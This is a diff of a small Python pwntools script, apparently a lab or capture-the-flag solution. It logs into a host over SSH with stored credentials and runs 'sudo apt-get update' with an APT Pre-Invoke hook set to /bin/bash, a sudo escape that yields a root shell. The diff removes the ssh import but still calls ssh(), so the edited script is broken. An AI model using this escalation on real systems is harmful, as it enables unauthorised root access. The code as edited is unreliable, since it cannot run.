@@ -1,16 +1,13 @@
 import json
-from pwnlib.tubes import ssh
 
 with open("metadata.json", "r") as f:
     md = json.loads(f.read())
-
 
 def buffer_predicate(buff):
     CMD = "example_command"  # Define CMD variable
     return len(buff) > len(CMD) and buff[-len(CMD):] == CMD
 
-
-s = ssh.ssh(host="work", user=md["username"], password=md["password"])
+s = ssh(host="work", user=md["username"], password=md["password"])
 sh = s.shell(tty=True)
 sh.recvuntil("$")  # user prompt ready
 sh.sendline("sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash")
